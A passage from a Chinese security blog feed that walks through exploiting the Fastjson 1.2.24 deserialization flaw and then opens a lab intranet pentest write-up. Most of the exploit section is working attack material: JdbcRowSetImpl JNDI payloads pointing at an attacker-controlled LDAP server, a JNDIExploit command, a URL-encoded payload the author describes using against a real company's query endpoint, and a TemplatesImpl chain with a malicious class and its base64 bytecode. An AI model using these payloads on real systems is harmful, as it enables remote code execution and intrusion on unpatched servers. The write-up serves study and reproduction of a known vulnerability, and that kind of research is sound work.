class="string">&quot;Username:&quot;</span>+<span class="keyword">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age:&quot;</span>+<span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>由于json1字符串未指定转换的对象类，没有调用setxxx()方法；而json2字符串使用了@type指定了所要转换的对象类，则调用了setxxx()方法。</p>
<p>可见<code>@type</code>参数的作用就是指定json字符串要反序列化的对象类。就是这个类让我们可以进行漏洞利用</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109170634344.png" class title="image-20211109170634344">



<p>相关知识:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ParserConfig类：</span><br><span class="line">配置反序列化信息</span><br><span class="line"></span><br><span class="line">Autotype：</span><br><span class="line">Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的Class类型。</span><br><span class="line"></span><br><span class="line">AutoType安全校验流程,假设如下场景，</span><br><span class="line">​ 服务端接收到的请求Json串中包含了指定恶意代码Class的@Type，</span><br><span class="line">​ 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码</span><br><span class="line"></span><br><span class="line">AutoType黑名单机制：</span><br><span class="line">在反序列化时，会校验指定的class是否在黑名单中，若在，则抛出异常</span><br><span class="line"></span><br><span class="line">Safemode机制：</span><br><span class="line">配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><hr>
<p>从上面可以看出 ，Fastjson反序列过程中会自动调用@type指定的对象类中的setxxx()方法。所以只要找到一个类，并且他里面的setxxx()方法可以设置自定义的命令执行的属性，就可以造成RCE。</p>
<p>注:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</span><br></pre></td></tr></table></figure>



<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><hr>
<p>com.sun.rowset.jdbcRowSetImpl这个类可以被利用，这个类里面有很多setxxxx()方法，我们需要利用的则是setDataSourceName()和setAutoCommit()方法。 </p>
<h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><p><strong>jdbcRowSetimpl.setDataSourceName</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">               <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">               <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到setDataSourceName()方法调用了父类中的setDataSourceName()方法，传入var1参数。</p>
<p><strong>BaseRowSet.setDataSourceName</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">          dataSource = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         dataSource = name;</span><br><span class="line">      &#125;</span><br><span class="line">      URL = <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>父类中的SetDataSourceName()方法将datasource设置为传入的参数</p>
<p><strong>jdbcRowSetimpl.setAutoCommit</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">         <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>setAutoCommit()方法调用了connect()方法</p>
<p><strong>jdbcRoeSetimpl.connect</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在connect()方法中使用lookup()调用getDataSourceName()方法，获取通过setDataSourceName()方法设置的DataSource，所以Sourcename是可以控制的。我们可以将Sourcename设置加载恶意类，从而利用造成命令执行。</p>
<p><strong>RCE</strong></p>
<p>我们可以将DataSourcename设置为搭建的ldap和RMI服务，这里使用的是JNDIExploit工具</p>
<p>[工具下载地址](<a href="https://github.com/Jeromeyoung/JNDIExploit-1">Jeromeyoung&#x2F;JNDIExploit-1: 一款用于JNDI注入利用的工具，大量参考&#x2F;引用了Rogue JNDI项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。 (github.com)</a>)</p>
<p><strong>Demo</strong></p>
<p>将 datasourcename设置为开启的ldap服务应用类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI_Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        String json = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/1vehsr\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>使用JNDIEXPLOIT工具开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java   -jar   JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar     -A 127.0.0.1     -C &quot;calc&quot;</span><br><span class="line"></span><br><span class="line"> -A     指定监听地址</span><br><span class="line"> -C     执行的命令</span><br></pre></td></tr></table></figure>

<p>可以看到命令成功执行</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211110110216214.png" class title="image-20211110110216214">





<h4 id="实战利用-这里的fastjson版本为1-2-21"><a href="#实战利用-这里的fastjson版本为1-2-21" class="headerlink" title="实战利用(这里的fastjson版本为1.2.21)"></a>实战利用(这里的fastjson版本为1.2.21)</h4><hr>
<p>在做某基金项目时公司前辈使用fastjson1.2.24反序列化实现了RCE，所以下来对该漏洞进行了复现</p>
<p>这是漏洞触发点，可以看到是个查询接口</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111211609793.png" class title="image-20211111211609793">



<p>该查询接口发现使用query参数(query_list)，将query参数格式设置为错误格式，比如删除其中的中括号或花括号</p>
<p>这里删掉啦最后的花括号，可以看到报错返回fastjson版本为1.2.41</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111212405478.png" class title="image-20211111212405478">



<p>这里使用dnslog来验证是否命令执行成功</p>
<p>在dnslog平台上获取域名</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111215010686.png" class title="image-20211111215010686">



<p>将JNDIExpoit工具放到自己的公网服务器上，并开启IDAP和RMI服务(注意jdk版本)</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111220410004.png" class title="image-20211111220410004">



<p>构造query参数加载jdbcSetRowimpl类设置dataSourceName为指定的LDAP服务或者RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7B%22ss%22:%7B%22@type%22:%22com.alibaba.fastjson.JSONObject%22,%7B%0A%20%20%20%20%22a%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22java.lang.Class%22,%0A%20%20%20%20%20%20%20%22val%22:%22com.sun.rowset.jdbcRowSetimpl%22%0A%20%20%20%20%7D,%0A%20%20%20%20%22b%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22com.sun.rowset.jdbcRowSetimpl%22,%0A%20%20%20%20%20%20%20%22dataSourceName%22:%22idap://公网服务器ip地址:1389/do9ouu%22,%0A%20%20%20%20%20%20%20%22autoCommit%22:true%0A%20%20%20%20%7D%0A%7D%7D</span><br></pre></td></tr></table></figure>



<p>构造的json利用poc如下:</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221213814.png" class title="image-20211111221213814">



<p>发包后可看到dnslog上有DNS解析，证明命令执行成功</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221622063.png" class title="image-20211111221622063">



<p>命令执行也可以设置为反弹shell造成RCE。</p>
<h3 id="Templatesimpl利用链"><a href="#Templatesimpl利用链" class="headerlink" title="Templatesimpl利用链"></a>Templatesimpl利用链</h3><hr>
<h4 id="利用流程-1"><a href="#利用流程-1" class="headerlink" title="利用流程"></a><strong>利用流程</strong></h4><p>思路如下；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 自定义构造恶意类TempletaPoc继承AbstractTranslet类，通过javassist字节码编程将恶意类TempletaPoc转换成字节码并对其进行base64编码。</span><br><span class="line"></span><br><span class="line">2. 构造TemplatesImpl类的json数据，将TempletaPoc类的字节码设置为_bytecodes属性的取值中，当json数据在还原成TemplatesImpl对象时会加载_bytecodes属性。此时，就会触发前面设置的TempletaPoc类字节码并实例化，执行构造的命令。</span><br></pre></td></tr></table></figure>



<p>构造恶意类TemplatePoc类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Templetapoc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是，需要导入com.sun.org.apache包，可通过在pom.xml配置文件下添加依赖下载资源导入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;com.sun.org.apache&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;jaxp-ri&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;1.4&lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p>使用javac.exe将java源代码编译成字节码，成功.class文件</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112112456462.png" class title="image-20211112112456462">



<p>我们使用工具查看编译成的二进制文件(hexdump或者一些编辑器)</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112142345785.png" class title="image-20211112142345785">



<p>将上面编译得到的字节码进行base64编码加密，加载编译得到的class文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loadclasstest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Users\\Administrator\\IdeaProjects\\fastjson_Demo\\src\\main\\java\\org\\example\\Templetapoc.class&quot;</span>));</span><br><span class="line">        String bytecode = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(bytecode);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Base64编码；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEAEFRlbXBsZXRhcG9jLmphdmEMAAkACgcAIQwAIgAjAQAEY2FsYwwAJAAlAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJgAKAQAXb3JnL2V4YW1wbGUvVGVtcGxldGFwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABYADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAA4ACQARAAwADwANABAAEQASABMAAAAHAAJMBwAUBAABABUAAAACABY=</span><br></pre></td></tr></table></figure>



<p>构造测试类，设置Templatesimpl类中的_bytecodes属性为Templetapoc,如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> org.example.User;</span><br><span class="line"><span class="keyword">import</span> org.example.Templetapoc;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Teamplatesimpl_test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> CannotCompileException,NotFoundException,IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//设置Base64编码的字节码</span></span><br><span class="line">        String byteCode = <span class="string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEAEFRlbXBsZXRhcG9jLmphdmEMAAkACgcAIQwAIgAjAQAEY2FsYwwAJAAlAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJgAKAQAXb3JnL2V4YW1wbGUvVGVtcGxldGFwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABYADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAA4ACQARAAwADwANABAAEQASABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>;</span><br><span class="line">        <span class="comment">//构造恶意的json字符串</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> + <span class="string">&quot;&#x27;_name&#x27;:T,&quot;</span> + <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> + <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object object = JSON.parseObject(payload,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下面我们来看下上面代码中的payload构造；</p>
<p>@type：当fastjson根据json数据对TemplatesImpl类进行反序列化时，会调用TemplatesImpl类的getOutputProperties方法触发利用链加载_bytecodes属性中的TempletaPoc类字节码并实例化，执行RCE代码。</p>
<p>_bytecodes：Templatesimpl类的属性，主要是承载恶意类TempletaPoc的字节码。就是把Templatepoc类先编译成字节码，然后再使用base64编码。</p>
<p>_name：关于_name属性，在调用TemplatesImpl利用链的过程中，会对_name进行不为null的校验。这里的_name取值为承载恶意类字节码，也就是前面的Templatepoc类。</p>
<p>_tfactory：在调用TemplatesImpl利用链时，defineTransletClasses方法内部会通过_tfactory属性调用一个getExternalExtensionsMap方法，如果_tfactory属性为null则会抛出异常，无法根据_bytecodes属性的内容加载并实例化恶意类。 </p>
<p>outputProperties：json数据在反序列化时会调用TemplatesImpl类的getOutputProperties方法触发利用链，可以理解为outputProperties属性的作用就是为了调用getOutputProperties方法。</p>
<p>运行结果；</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112205132938.png" class title="image-20211112205132938">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">值得注意的是:</span><br><span class="line">需要开启Feature.SupportNonPublicField，实战中不适用</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>开发框架漏洞</category>
        <category>Fastjson</category>
      </categories>
      <tags>
        <tag>-web漏洞 -框架漏洞 -反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场</title>
    <url>/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="红日靶场内网渗透"><a href="#红日靶场内网渗透" class="headerlink" title="红日靶场内网渗透"></a>红日靶场内网渗透</h1><h2 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h2><p>外网攻击主机:  kali         </p>
<p>172.16.243.128</p>
<p>内网中的web服务器:   win7      </p>
<p>公网ip:   172.16.243.130</p>
<p> 私网ip:   192.168.52.140</p>
<p>​      </p>
<p>内网中的域成员主机:   win2003</p>
<p>  192.168.52.141</p>
<p>内网中的域控主机:     win2008</p>
<p>  192.168.52.138</p>
<p>kali作为攻击主机，win7作为web服务器防止两个网卡，能连接内网，web服务被外网所访问</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>首先确定攻击网卡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -I</span><br><span class="line">或者 ifconfig </span><br></pre></td></tr></table></figure>

<p>可以看到下面的kali的两个网卡，这里使用的是eth0网卡</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805200341062.png" alt="image-20210805200341062"></p>
<p>使用arp-scan对主机使用网卡的局域网内的主机进行扫描</p>
